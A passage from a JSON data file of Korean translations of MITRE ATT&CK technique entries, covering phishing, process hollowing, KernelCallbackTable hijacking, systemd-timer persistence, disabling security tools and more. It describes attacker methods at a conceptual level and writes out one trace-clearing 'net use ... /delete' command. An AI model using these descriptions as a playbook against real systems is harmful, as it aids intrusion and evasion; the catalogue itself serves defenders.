    "description": "적대자는 목표 설정 중에 사용할 수 있는 소프트웨어 도구를 구매, 훔치거나 다운로드할 수 있습니다. 도구는 오픈 소스거나 폐쇄 소스일 수 있으며, 무료이거나 상용일 수 있습니다. 도구는 적대자가 악의적인 목적으로 사용할 수 있지만(악성코드와는 달리) 본래 그런 목적으로 사용되도록 설계되지 않았습니다. 도구 획득에는 상용 소프트웨어 라이선스 구매가 포함될 수 있으며, 레드 팀 도구와 같은 도구들을 포함합니다. 상용 소프트웨어는 구매, 라이선스(또는 소프트웨어의 라이선스 사본)를 도용하거나 시험 버전을 크래킹하여 얻을 수 있습니다.\n\n적대자는 운영을 지원하기 위해 도구를 획득할 수 있으며, 이는 타협 후 행동을 실행하는 데에도 도움이 됩니다. 무료로 소프트웨어를 다운로드하거나 구매하는 것 외에도, 적대자는 제3자(다른 적대자를 포함한)로부터 소프트웨어 및/또는 소프트웨어 라이선스를 훔칠 수 있습니다.",
    "external_id": "T1588.002",
    "modified": "2024-09-16T16:20:16.431Z",
    "translated": true
  },
  {
    "title": "Exfiltration over USB",
    "description": "적대자는 USB에 연결된 물리적 장치를 통해 데이터를 유출하려고 시도할 수 있습니다. 공중 분리된 네트워크가 손상된 특정 상황에서는 사용자가 삽입한 USB 장치를 통해 데이터 유출이 발생할 수 있습니다. USB 장치는 최종 유출 지점으로 사용되거나 서로 연결되지 않은 시스템 간에 데이터 전송을 할 수 있습니다.",
    "external_id": "T1052.001",
    "modified": "2021-10-15T22:48:29.490Z",
    "translated": true
  },
  {
    "title": "KernelCallbackTable",
    "description": "적대자는 프로세스의 <code>KernelCallbackTable</code>을 악용하여 실행 흐름을 탈취하고 자신의 페이로드를 실행할 수 있습니다. <code>KernelCallbackTable</code>은 프로세스 환경 블록(PEB)에서 찾을 수 있으며, <code>user32.dll</code>이 로드되면 GUI 프로세스에서 사용할 수 있는 그래픽 함수의 배열로 초기화됩니다.\n\n적대자는 <code>KernelCallbackTable</code>을 이용해 원래의 콜백 함수를 악성 페이로드로 교체함으로써 프로세스의 실행 흐름을 탈취할 수 있습니다. 콜백 함수를 수정하는 것은 관련된 행동과 관련된 다양한 방법으로 달성될 수 있습니다.\n\n<code>KernelCallbackTable</code>의 메모리 주소에 대한 포인터는 PEB를 찾아서 얻을 수 있습니다. 포인터를 찾은 후, <code>KernelCallbackTable</code>을 복제하고 테이블의 함수(예: <code>fnCOPYDATA</code>)를 악성 페이로드의 주소로 설정합니다. 그런 다음 PEB는 테이블의 새 주소로 업데이트됩니다. 조작된 함수가 호출되면 악성 페이로드가 실행됩니다.\n\n조작된 함수는 일반적으로 Windows 메시지를 통해 호출됩니다. 프로세스가 탈취되고 악성 코드가 실행된 후, <code>KernelCallbackTable</code>은 악성 페이로드의 나머지 부분에 의해 원래 상태로 복구될 수도 있습니다. <code>KernelCallbackTable</code>을 사용한 실행 흐름의 탈취는 실행이 합법적인 프로세스 아래에서 가려질 수 있기 때문에 보안 제품의 탐지를 피할 수 있습니다.",
    "external_id": "T1574.013",
    "modified": "2022-03-22T15:47:33.915Z",
    "translated": true
  },
  {
    "title": "Search Closed Sources",
    "description": "적대자들은 타겟팅을 위해 사용할 수 있는 폐쇄된 소스(예: 유료, 비공식적 또는 자유롭게 이용할 수 없는 소스)에서 피해자에 대한 정보를 검색하고 수집할 수 있습니다. 피해자에 대한 정보는 신뢰할 수 있는 사설 소스와 데이터베이스에서 구매할 수 있으며, 예를 들어 기술/위협 정보 데이터의 유료 구독 서비스와 같은 형태로 제공됩니다. 적대자들은 또한 다크웹이나 사이버 범죄 불법 시장과 같은 신뢰성이 낮은 소스에서 정보를 구매할 수 있습니다.\n\n적대자들은 수집하고자 하는 정보에 따라 다양한 폐쇄 데이터베이스에서 검색할 수 있습니다. 이러한 소스의 정보는 다른 형태의 정보 수집 기회를 드러낼 수 있으며, 작전 자원을 구축하거나 초기 접근을 설정하는 데 도움이 됩니다.",
    "external_id": "T1597",
    "modified": "2024-10-04T13:12:14.469Z",
    "translated": true
  },
  {
    "title": "Systemd Timers",
    "description": "적대자는 systemd 타이머를 악성 코드의 초기 또는 반복 실행을 위한 작업 스케줄링에 악용할 수 있습니다. systemd 타이머는 서비스를 제어하는 <code>.timer</code> 확장자를 가진 유닛 파일입니다. 타이머는 캘린더 이벤트에 따라 실행되거나 시작점에 대한 시간 경과 후에 실행되도록 설정할 수 있습니다. 이는 리눅스 환경에서 Cron의 대안으로 사용될 수 있습니다. systemd 타이머는 <code>systemctl</code> 명령 줄 유틸리티를 통해 원격으로 활성화될 수 있으며, 이는 SSH를 통해 작동합니다.\n\n각 <code>.timer</code> 파일은 동일한 이름의 <code>.service</code> 파일과 대응되어야 합니다. 예를 들어, <code>example.timer</code>와 <code>example.service</code>입니다. <code>.service</code> 파일은 systemd 시스템 및 서비스 관리자가 관리하는 [Systemd 서비스] 유닛 파일입니다. 권한이 있는 타이머는 <code>/etc/systemd/system/</code> 및 <code>/usr/lib/systemd/system</code>에 작성되며, 사용자 수준의 타이머는 <code>~/.config/systemd/user/</code>에 작성됩니다.\n\n적대자는 systemd 타이머를 사용하여 시스템 시작 시 또는 정기적으로 악성 코드를 실행하여 지속성을 확보할 수 있습니다. 권한이 있는 경로를 사용하여 설치된 타이머는 루트 수준의 지속성을 유지하는 데 사용할 수 있습니다. 적대자는 또한 사용자 수준의 지속성을 달성하기 위해 사용자 수준 타이머를 설치할 수 있습니다.",
    "external_id": "T1053.006",
    "modified": "2024-10-15T16:42:51.536Z",
    "translated": true
  },
  {
    "title": "Phishing",
    "description": "적대자는 희생자의 시스템에 접근하기 위해 피싱 메시지를 보낼 수 있습니다. 모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 피싱은 특정 개인, 회사 또는 산업을 대상으로 하는 표적 피싱(스피어 피싱)으로 이루어질 수 있습니다. 보다 일반적으로, 적대자는 대규모 악성 소프트웨어 스팸 캠페인과 같이 비표적 피싱을 수행할 수 있습니다.\n\n적대자는 피해자에게 악성 첨부파일이나 링크가 포함된 이메일을 보내 시스템에서 악성 코드를 실행하도록 할 수 있습니다. 피싱은 소셜 미디어 플랫폼과 같은 제3자 서비스를 통해서도 수행될 수 있습니다. 피싱은 신뢰할 수 있는 출처인 척하거나, 이메일이나 메타데이터/헤더를 제거하거나 조작하여 악용된 침해 계정에서 메시지를 전송하는 등의 회피 기술을 포함할 수 있습니다. 또 다른 방법으로는 발신자의 신원을 위조하거나 스푸핑하여 인간 수신자 및 자동 보안 도구를 속일 수 있으며, 악성 파일이나 링크가 포함된 기존 이메일 스레드에 의도된 대상을 포함시키는 방법(즉, \"스레드 하이재킹\")이 있습니다.\n\n희생자는 또한 전화번호로 전화하라고 지시하는 피싱 메시지를 받을 수 있으며, 여기에서 그들은 악성 URL을 방문하거나 악성 코드를 다운로드하거나, 적대자가 접근할 수 있는 원격 관리 도구를 컴퓨터에 설치하도록 안내받습니다.",
    "external_id": "T1566",
    "modified": "2024-10-07T15:00:19.668Z",
    "translated": true
  },
  {
    "title": "ROMMONkit",
    "description": "적대자는 권한이 없는 펌웨어를 로드하여 지속적인 접근을 제공하고 탐지하기 어려운 방식으로 장치 동작을 조작하기 위해 ROM 모니터(ROMMON)를 악용할 수 있습니다.\n\nROMMON은 플랫폼이 전원이 켜지거나 재설정될 때 하드웨어와 소프트웨어를 초기화하는 부트 로더, 부트 이미지 또는 부트 헬퍼로 작동하는 시스코 네트워크 장치의 펌웨어입니다. 적대자는 ROMMON 이미지를 로컬 또는 원격으로(예: TFTP를 통해) 자신의 코드를 사용하여 업그레이드하고 장치를 재시작하여 기존 ROMMON 이미지를 덮어쓸 수 있습니다. 이는 적대자에게 시스템에서 지속성을 확보할 수 있는 수단을 제공하며, 이러한 방식은 탐지가 어려울 수 있습니다.",
    "external_id": "T1542.004",
    "modified": "2020-10-22T02:18:19.568Z",
    "translated": true
  },
  {
    "title": "Compiled HTML File",
    "description": "공격자는 컴파일된 HTML 파일(.chm)을 악성 코드를 숨기는 데 악용할 수 있습니다. CHM 파일은 일반적으로 Microsoft HTML 도움말 시스템의 일부로 배포됩니다. CHM 파일은 HTML 문서, 이미지 및 VBA, JScript, Java 및 ActiveX와 같은 스크립팅/웹 관련 프로그래밍 언어를 포함한 다양한 콘텐츠의 압축된 컴파일입니다. CHM 콘텐츠는 HTML 도움말 실행 프로그램(hh.exe)에 의해 로드된 인터넷 익스플로러 브라우저의 기본 구성 요소를 사용하여 표시됩니다.\n\n임베디드 페이로드를 포함하는 맞춤형 CHM 파일이 피해자에게 전달된 후 [사용자 실행]으로 트리거될 수 있습니다. CHM 실행은 hh.exe를 통한 바이너리 실행을 고려하지 않는 구형 및/또는 패치되지 않은 시스템에서 응용 프로그램 제어를 우회할 수도 있습니다.",
    "external_id": "T1218.001",
    "modified": "2023-10-18T16:31:56.936Z",
    "translated": true
  },
  {
    "title": "Network Share Connection Removal",
    "description": "적대자는 더 이상 유용하지 않은 공유 연결을 제거하여 작업의 흔적을 정리할 수 있습니다. Windows 공유 드라이브 및 SMB/Windows 관리자 공유 연결은 더 이상 필요하지 않을 때 제거될 수 있습니다. 네트 유틸리티는 <code>net use \\\\system\\share /delete</code> 명령을 사용하여 네트워크 공유 연결을 제거하는 데 사용할 수 있습니다.",
    "external_id": "T1070.005",
    "modified": "2023-04-13T17:15:56.948Z",
    "translated": true
  },
  {
    "title": "Multi-hop Proxy",
    "description": "적대자는 여러 프록시를 연결하여 악성 트래픽의 출처를 숨길 수 있습니다. 일반적으로 방어자는 자신의 네트워크에 들어오기 전에 통과한 마지막 프록시의 트래픽을 식별할 수 있으며, 방어자는 마지막 홉 프록시 이전의 어떤 프록시를 식별할 수 있을 수도 있고 그렇지 않을 수도 있습니다. 이 기술은 방어자가 악성 트래픽의 출처를 식별하기 위해 여러 프록시를 통해 악성 트래픽을 추적해야 하므로 원래 출처를 식별하는 것을 더욱 어렵게 만듭니다.\n\n적대자는 또한 다층 라우팅 네트워크를 구성하거나 사용하여 암호화된 C2 트래픽을 손상된 장치들 사이에서 전송할 수 있습니다. 이로 인해 공격자는 네트워크 내의 어떤 장치와도 통신할 수 있게 됩니다. \n\n네트워크 인프라의 경우, 적대자가 여러 손상된 장치를 활용하여 다중 홉 프록시 체인을 만들 수 있습니다. 라우터에서 시스템 이미지에 패치를 적용함으로써, 적대자는 해당 네트워크 장치에 사용자 정의 코드를 추가하여 그 노드 간에 다층 라우팅을 구현할 수 있습니다. 이 방법은 적대자가 인터넷 경계를 넘어 조직의 광역 네트워크(WAN)로 접근할 수 있도록 하는 네트워크 경계 브리징 방법에 의존합니다. ICMP와 같은 프로토콜이 전송 수단으로 사용될 수 있습니다.\n\n비슷하게, 적대자는 P2P(peer-to-peer) 및 블록체인 지향 인프라를 악용하여 분산된 네트워크의 피어 간에 라우팅을 구현할 수 있습니다.",
    "external_id": "T1090.003",
    "modified": "2024-09-25T20:48:24.411Z",
    "translated": true
  },
  {
    "title": "Brute Force",
    "description": "적대자는 비밀번호를 알 수 없거나 비밀번호 해시를 입수했을 때 계정에 접근하기 위해 무차별 대입 기술을 사용할 수 있습니다. 계정 또는 계정 집합에 대한 비밀번호를 알지 못하는 경우, 적대자는 반복적이거나 반복적인 메커니즘을 사용하여 비밀번호를 체계적으로 추측할 수 있습니다. 비밀번호에 대한 무차별 대입은 자격 증명의 유효성을 확인하는 서비스와의 상호작용을 통해 또는 이전에 획득한 자격 증명 데이터(예: 비밀번호 해시)에 대해 오프라인으로 진행될 수 있습니다.\n\n자격 증명을 무차별 대입하는 행위는 침해의 다양한 지점에서 발생할 수 있습니다. 예를 들어, 적대자는 피해자의 환경 내에서 발생한 다른 후속 행동에서 수집한 정보를 활용하여 유효한 계정에 대한 접근을 무차별 대입하려고 할 수 있습니다. 적대자는 또한 초기 접근의 일환으로 외부 원격 서비스와 같은 행동과 무차별 대입 활동을 결합할 수 있습니다.",
    "external_id": "T1110",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Unix Shell",
    "description": "적대자는 Unix 셸 명령어와 스크립트를 실행하기 위해 악용할 수 있습니다. Unix 셸은 Linux 및 macOS 시스템의 기본 명령 프롬프트이며, 특정 운영 체제나 배포판에 따라 다양한 Unix 셸이 존재합니다. Unix 셸은 시스템의 모든 측면을 제어할 수 있으며, 특정 명령어는 권한 상승이 필요합니다.\n\nUnix 셸은 명령어를 순차적으로 실행할 수 있는 스크립트와 조건문 및 루프와 같은 기타 일반적인 프로그래밍 작업을 지원합니다. 셸 스크립트의 일반적인 사용 사례에는 긴 작업이나 반복 작업, 또는 여러 시스템에서 동일한 명령 집합을 실행해야 하는 경우가 포함됩니다.\n\n적대자는 Unix 셸을 악용하여 다양한 명령어 또는 페이로드를 실행할 수 있습니다. 대화형 셸은 명령 및 제어 채널을 통해 접근되거나 SSH와 같은 수평 이동 중에 접근될 수 있습니다. 적대자는 또한 셸 스크립트를 활용하여 피해자에게 여러 명령을 전달하고 실행하거나 지속성 확보를 위한 페이로드의 일부로 사용할 수 있습니다.",
    "external_id": "T1059.004",
    "modified": "2024-10-15T15:17:19.136Z",
    "translated": true
  },
  {
    "title": "Outlook Forms",
    "description": "적대자는 손상된 시스템에서 지속성을 확보하기 위해 Microsoft Outlook 양식을 악용할 수 있습니다. Outlook 양식은 Outlook 메시지의 프레젠테이션 및 기능을 위한 템플릿으로 사용됩니다. 특정하게 제작된 이메일이 적대자에 의해 전송될 때 코드를 실행하는 사용자 정의 Outlook 양식을 생성할 수 있습니다.\n\n악성 양식이 사용자의 메일박스에 추가되면 Outlook이 시작될 때 로드됩니다. 악성 양식은 적대자가 사용자에게 특정하게 제작된 이메일을 보낼 때 실행됩니다.",
    "external_id": "T1137.003",
    "modified": "2024-10-15T16:02:00.782Z",
    "translated": true
  },
  {
    "title": "Disable or Modify Tools",
    "description": "적대자들은 맬웨어/툴 및 활동의 가능성 있는 탐지를 피하기 위해 보안 도구를 수정하거나 비활성화할 수 있습니다. 이는 보안 소프트웨어 프로세스나 서비스를 종료하거나, 도구가 제대로 작동하지 않도록 레지스트리 키나 구성 파일을 수정/삭제하는 방식 등 여러 형태로 나타날 수 있으며, 보안 도구의 스캔이나 정보 보고를 방해하는 다른 방법들이 포함될 수 있습니다. 적대자들은 최신 보안 패치가 피해 시스템의 도구에 도달하는 것을 방지하기 위해 업데이트를 비활성화할 수도 있습니다. \n\n적대자들은 보안 도구에 의해 배포되고 사용되는 아티팩트에 접근하여 변조할 수도 있습니다. 보안 도구는 특정 이벤트에 대한 가시성을 유지하기 위해 시스템 구성 요소에 동적인 변경을 가할 수 있습니다. 예를 들어, 보안 제품은 자체 모듈을 로드하거나 데이터 수집을 용이하게 하기 위해 프로세스에 의해 로드된 모듈을 수정할 수 있습니다. 적대자들은 이러한 도구에 의해 추가된 기능(특히 사용자 공간에 존재하거나 적대자들이 접근할 수 있는 가능성이 있는 기능)을 탐지를 피하기 위해 훼손하거나 수정할 수 있습니다.\n\n적대자들은 Sysmon과 같은 특정 애플리케이션에 집중할 수도 있습니다. 예를 들어, 레지스트리 경로의 “Start” 및 “Enable” 값이 수정되어 Sysmon 로그를 변조하고 비활성화할 수 있습니다.\n\n네트워크 장비에서는 적대자들이 시작 구성 파일을 변경하여 부팅 시 일반적으로 발생하는 펌웨어 검증을 비활성화하고 디지털 서명 확인 검사를 우회하려고 시도할 수 있습니다.\n\n클라우드 환경에서 적대자들에 의해 비활성화된 도구에는 AWS CloudWatch나 Google Cloud Monitor와 같은 서비스에 보고하는 클라우드 모니터링 에이전트가 포함될 수 있습니다. \n\n게다가, 방어 도구가 안티탐퍼링 메커니즘을 갖추고 있더라도, 적대자들은 합법적인 루트킷 제거 도구와 같은 도구를 악용하여 이러한 도구를 손상시키거나 비활성화할 수 있습니다. 예를 들어, 적대자들은 GMER과 같은 도구를 사용하여 감염된 시스템에서 숨겨진 프로세스와 안티바이러스 소프트웨어를 찾아 종료시킨 사례가 있습니다.\n\n추가적으로, 적대자들은 안티바이러스 소프트웨어의 합법적인 드라이버를 이용하여 커널 공간에 접근하여 안티탐퍼링 기능을 우회할 수 있습니다.",
    "external_id": "T1562.001",
    "modified": "2024-04-12T21:13:46.640Z",
    "translated": true
  },
  {
    "title": "Data Manipulation",
    "description": "적대자는 외부 결과에 영향을 미치거나 활동을 숨기기 위해 데이터를 삽입, 삭제 또는 조작할 수 있으며, 이로 인해 데이터의 무결성이 위협받습니다. 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직 이해 또는 의사 결정에 영향을 미치려 할 수 있습니다.\n\n수정의 유형과 그로 인한 영향은 대상 애플리케이션과 프로세스뿐만 아니라 적대자의 목표와 목적에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 일반적으로 필요한 영향을 미치기 위해 장기간의 정보 수집 캠페인을 통해 얻은 특별한 전문 지식과 시스템과 관련된 특수 소프트웨어에 대한 접근이 필요할 것입니다.",
    "external_id": "T1565",
    "modified": "2024-02-02T17:18:39.004Z",
    "translated": true
  },
  {
    "title": "Inter-Process Communication",
    "description": "적대자는 로컬 코드 또는 명령 실행을 위해 프로세스 간 통신(IPC) 메커니즘을 악용할 수 있습니다. IPC는 일반적으로 프로세스가 데이터를 공유하거나 서로 소통하며 실행을 동기화하는 데 사용됩니다. 또한 IPC는 프로세스가 순환 대기 패턴에 갇힐 때 발생하는 교착 상태와 같은 상황을 피하는 데 일반적으로 사용됩니다.\n\n적대자는 IPC를 악용하여 임의의 코드나 명령을 실행할 수 있습니다. IPC 메커니즘은 운영 체제에 따라 다를 수 있지만, 일반적으로 프로그래밍 언어/라이브러리 또는 Windows의 기본 인터페이스 형태로 접근할 수 있습니다. 리눅스 환경은 소켓과 파이프와 같은 여러 가지 IPC 메커니즘을 지원합니다. 고수준 실행 매개체, 예를 들어 명령 및 스크립트 해석기의 에코시스템도 기본 IPC 메커니즘을 활용할 수 있습니다. 적대자는 원격 IPC 실행을 촉진하기 위해 분산 구성 요소 개체 모델과 같은 원격 서비스를 사용할 수도 있습니다.",
    "external_id": "T1559",
    "modified": "2024-09-10T19:06:35.666Z",
    "translated": true
  },
  {
    "title": "Data Obfuscation",
    "description": "적대자는 명령 및 제어 트래픽을 모호하게 하여 탐지하기 어렵게 만들 수 있습니다. 명령 및 제어(C2) 통신은 내용을 발견하거나 해독하기 더 어렵게 만들기 위해 숨겨지며(하지만 반드시 암호화되지는 않음) 통신을 덜 눈에 띄게 만들고 명령이 보이지 않도록 숨깁니다. 여기에는 프로토콜 트래픽에 잡음 데이터를 추가하거나 스테가노그래피를 사용하거나 합법적인 프로토콜을 가장하는 등의 다양한 방법이 포함됩니다.",
    "external_id": "T1001",
    "modified": "2024-10-07T15:07:47.232Z",
    "translated": true
  },
  {
    "title": "Data from Network Shared Drive",
    "description": "적대자는 그들이 침해한 컴퓨터의 네트워크 공유를 검색하여 관심 있는 파일을 찾을 수 있습니다. 민감한 데이터는 현재 시스템에서 엑스필트레이션 전에 접근 가능한 공유 네트워크 드라이브(호스트 공유 디렉토리, 네트워크 파일 서버 등)를 통해 원격 시스템에서 수집될 수 있습니다. 인터랙티브 명령 셸이 사용될 수 있으며, 정보 수집을 위해 일반적인 기능이 활용될 수 있습니다.",
    "external_id": "T1039",
    "modified": "2023-08-11T21:06:07.690Z",
    "translated": true
  },
  {
    "title": "Modify System Image",
    "description": "적대자는 임베디드 네트워크 장치의 운영 체제를 변경하여 방어를 약화시키고 자신을 위한 새로운 기능을 제공할 수 있습니다. 이러한 장치에서 운영 체제는 일반적으로 단일 모듈형이며, 대부분의 장치 기능과 능력은 하나의 파일에 포함되어 있습니다.\n\n운영 체제를 변경하려면 적대자는 일반적으로 이 하나의 파일에만 영향을 미치면 되며, 이를 교체하거나 수정하는 방식으로 진행됩니다. 이는 즉각적인 효과를 위해 시스템 실행 중 메모리에서 실시간으로 수행하거나, 네트워크 장치의 다음 부팅 시 변경 사항을 적용하기 위해 저장소에서 수행될 수 있습니다.",
    "external_id": "T1601",
    "modified": "2020-10-22T17:50:47.635Z",
    "translated": true
  },
  {
    "title": "Hijack Execution Flow",
    "description": "적대자는 운영 체제가 프로그램을 실행하는 방식을 탈취하여 자신만의 악성 페이로드를 실행할 수 있습니다. 실행 흐름을 탈취하는 것은 지속성을 위한 목적일 수 있으며, 이 탈취된 실행은 시간이 지남에 따라 반복될 수 있습니다. 적대자는 또한 이러한 메커니즘을 사용하여 권한을 상승시키거나 애플리케이션 제어 또는 기타 실행 제한과 같은 방어를 회피할 수 있습니다.\n\n적대자가 실행 흐름을 탈취할 수 있는 방법은 여러 가지가 있으며, 운영 체제가 실행할 프로그램을 찾는 방식을 조작하는 방법이 포함됩니다. 프로그램에서 사용할 라이브러리를 운영 체제가 찾는 방식도 가로챌 수 있습니다. 운영 체제가 프로그램이나 리소스를 찾는 위치, 예를 들어 파일 디렉터리와 Windows의 경우 레지스트리는 악성 페이로드를 포함하도록 오염될 수 있습니다.",
    "external_id": "T1574",
    "modified": "2023-11-21T20:02:33.404Z",
    "translated": true
  },
  {
    "title": "Indicator Removal from Tools",
    "description": "적대자는 악성 도구가 탐지되거나 격리된 경우, 해당 도구에서 지표를 제거할 수 있습니다. 그들은 지표를 제거하고 대상의 방어 시스템이나 이후 유사한 시스템을 사용하는 대상에서 더 이상 탐지되지 않는 업데이트된 버전을 사용함으로써 도구를 수정할 수 있습니다.\n\n이러한 사례로는 악성 코드가 파일 서명에 의해 탐지되고 바이러스 백신 소프트웨어에 의해 격리되는 경우가 있습니다. 악성 코드가 파일 서명 때문에 격리되었음을 판단할 수 있는 적대자는 해당 서명을 피하기 위해 파일을 수정한 다음, 악성 코드를 재사용할 수 있습니다.",
    "external_id": "T1027.005",
    "modified": "2022-04-28T16:07:48.062Z",
    "translated": true
  },
  {
    "title": "Malicious Image",
    "description": "적대자는 사용자가 악성 이미지를 실행하도록 유도할 수 있습니다. 아마존 웹 서비스(AWS) 아마존 머신 이미지(AMIs), 구글 클라우드 플랫폼(GCP) 이미지, 및 애저 이미지와 같은 인기 있는 컨테이너 런타임 역시 백도어가 설치될 수 있습니다. 백도어가 설치된 이미지는 공개 리포지토리에 업로드될 수 있으며, 사용자는 이미지가 악성이라는 사실을 인식하지 못한 채로 해당 이미지를 기반으로 인스턴스나 컨테이너를 다운로드하고 배포하게 되어, 초기 접근을 달성하기 위해 특별히 설계된 기술을 우회할 수 있습니다. 이로 인해 암호화폐 채굴을 수행하는 악성 코드와 같은 코드가 인스턴스나 컨테이너에서 실행될 수 있습니다.\n\n적대자는 또한 사용자가 이미지를 잘못 배포할 가능성을 높이기 위해 이미지를 특정 방식으로 이름 붙일 수 있습니다.",
    "external_id": "T1204.003",
    "modified": "2021-08-26T16:42:35.318Z",
    "translated": true
  },
  {
    "title": "Container Service",
    "description": "적대자는 개별 호스트에서 데몬, 에이전트 또는 서비스로 실행되는 컨테이너 또는 컨테이너 클러스터 관리 도구를 생성하거나 수정할 수 있습니다. 여기에는 Docker 및 Podman과 같은 개별 컨테이너를 생성하고 관리하는 소프트웨어와 kubelet과 같은 컨테이너 클러스터 노드 수준 에이전트가 포함됩니다. 이러한 서비스를 수정함으로써 적대자는 호스트에서 지속성을 확보하거나 권한을 상승시킬 수 있습니다.\n\n예를 들어, `docker run` 또는 `podman run` 명령어를 `restart=always` 지시와 함께 사용하면 컨테이너가 호스트에서 지속적으로 재시작되도록 구성할 수 있습니다. (루트 권한이 있는) docker 명령에 접근할 수 있는 사용자는 호스트에서 권한을 상승시킬 수 있습니다.\n\nKubernetes 환경에서 DaemonSet은 적대자가 모든 노드에 걸쳐 지속적으로 컨테이너를 배포할 수 있게 해줍니다. 여기에는 나중에 클러스터에 추가된 노드도 포함됩니다. Pods는 pod 사양의 `nodeSelector` 또는 `nodeName` 필드를 사용하여 특정 노드에 배포할 수도 있습니다.\n\n또한 컨테이너는 Systemd 서비스로 실행되도록 구성될 수 있다는 점에 유의해야 합니다.",
    "external_id": "T1543.005",
    "modified": "2024-04-16T12:35:38.832Z",
    "translated": true
  },
  {
    "title": "Valid Accounts",
    "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 기존 계정의 자격 증명을 획득하고 악용할 수 있습니다. 손상된 자격 증명은 네트워크 내 시스템의 다양한 리소스에 설정된 액세스 제어를 우회하는 데 사용될 수 있으며, 원격 시스템 및 VPN, Outlook 웹 액세스, 네트워크 장치, 원격 데스크톱과 같은 외부에서 제공되는 서비스에 대한 지속적인 접근을 위해 사용될 수도 있습니다. 손상된 자격 증명은 또한 적대자에게 특정 시스템에 대한 증가된 권한이나 네트워크의 제한된 영역에 대한 접근을 허용할 수 있습니다. 적대자는 이러한 자격 증명이 제공하는 합법적인 접근과 함께 악성 소프트웨어나 도구를 사용하지 않기로 선택하여 자신의 존재를 감지하기 어렵게 만들 수 있습니다.\n\n일부 경우, 적대자는 비활성 계정을 악용할 수 있습니다. 예를 들어, 더 이상 조직의 일원이 아닌 개인의 계정이 그 예입니다. 이러한 계정을 사용하면 적대자가 탐지를 회피할 수 있으며, 원래 계정 사용자가 자신의 계정에서 발생하는 이상 활동을 식별할 수 없기 때문입니다.\n\n네트워크 내 시스템의 로컬, 도메인 및 클라우드 계정 간의 권한 중복은 우려의 대상입니다. 적대자는 계정 및 시스템 간 전환하여 높은 수준의 접근(즉, 도메인 또는 기업 관리자)에 도달하여 기업 내에 설정된 접근 제어를 우회할 수 있습니다.",
    "external_id": "T1078",
    "modified": "2024-10-15T16:09:46.024Z",
    "translated": true
  },
  {
    "title": "Non-Standard Port",
    "description": "적대자는 일반적으로 연관되지 않은 프로토콜과 포트 조합을 사용하여 통신할 수 있습니다. 전통적인 포트 443 대신에 포트 8088이나 포트 587을 통해 HTTPS를 사용할 수 있습니다. 적대자는 네트워크 데이터의 필터링을 우회하거나 분석/구문 분석을 혼란스럽게 하기 위해 프로토콜에서 사용되는 표준 포트를 변경할 수 있습니다.\n\n또한, 적대자는 비표준 포트를 악용하기 위해 희생 시스템에 변경을 가할 수 있습니다. 예를 들어, 레지스트리 키와 기타 구성 설정을 사용하여 프로토콜과 포트 조합을 수정할 수 있습니다.",
    "external_id": "T1571",
    "modified": "2024-09-12T19:37:57.868Z",
    "translated": true
  },
  {
    "title": "Social Media Accounts",
    "description": "적대자는 타겟팅 동안 사용할 수 있는 소셜 미디어 계정을 생성하고 키울 수 있습니다. 적대자는 운영을 더욱 발전시키기 위해 페르소나를 구축하는 데 사용할 수 있는 소셜 미디어 계정을 만들 수 있습니다. 페르소나 개발은 공개 정보, 존재, 이력 및 적절한 연계를 개발하는 것으로 구성됩니다.\n\n소셜 공학을 포함하는 작전에서는 소셜 미디어에서 페르소나를 활용하는 것이 중요할 수 있습니다. 이러한 페르소나는 허구일 수도 있고 실제 사람을 사칭할 수도 있습니다. 페르소나는 단일 소셜 미디어 사이트 또는 여러 사이트(예: 페이스북, 링크드인, 트위터 등)에 존재할 수 있습니다. 소셜 미디어에서 페르소나를 설정하려면 그들이 진짜처럼 보이도록 추가 문서를 개발해야 할 수 있습니다. 이는 프로필 정보 작성, 소셜 네트워크 개발 또는 사진 포함 등을 포함할 수 있습니다.\n\n페르소나가 개발되면 적대자는 이를 사용하여 관심 있는 타겟과의 연결을 만들 수 있습니다. 이러한 연결은 직접적일 수도 있고 타인을 통해 연결을 시도할 수도 있습니다. 이러한 계정은 초기 접근과 같은 적대자의 생애 주기의 다른 단계에서 활용될 수 있습니다.",
    "external_id": "T1585.001",
    "modified": "2021-10-16T17:37:34.563Z",
    "translated": true
  },
  {
    "title": "Process Hollowing",
    "description": "적대자는 프로세스 기반 방어를 회피하기 위해 중단된 프로세스와 속 빈 강정 프로세스에 악성 코드를 주입할 수 있습니다. 프로세스 홀로잉은 별도의 활성 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다.\n\n프로세스 홀로잉은 일반적으로 중단된 상태에서 프로세스를 생성한 다음, 해당 프로세스의 메모리를 언맵 또는 홀로잉하여 악성 코드로 교체하는 방식으로 수행됩니다. 피해자 프로세스는 기본 Windows API 호출을 사용하여 생성할 수 있으며, 여기에는 프로세스의 기본 스레드를 중단 상태로 만들기 위한 플래그가 포함됩니다. 이 시점에서 프로세스는 API 호출을 사용하여 언맵된 후, 주입된 코드에 맞게 재정렬되고, 이후에 다시 실행될 수 있습니다.\n\n이는 [스레드 로컬 저장소](https://attack.mitre.org/techniques/T1055/005)와 매우 유사하지만, 기존 프로세스를 대상으로 하는 대신 새로운 프로세스를 생성합니다. 이 행동은 주입된 프로세스가 주입 프로세스에서 생성되었으므로(따라서 보안 컨텍스트를 상속받기 때문에) 권한 상승을 초래하지 않을 가능성이 큽니다. 그러나 프로세스 홀로잉을 통한 실행은 정당한 프로세스 아래에서 실행이 숨겨지기 때문에 보안 제품의 탐지를 회피할 수도 있습니다.",
    "external_id": "T1055.012",
    "modified": "2024-09-12T15:11:45.602Z",
    "translated": true
  },
  {
    "title": "Exploitation for Privilege Escalation",
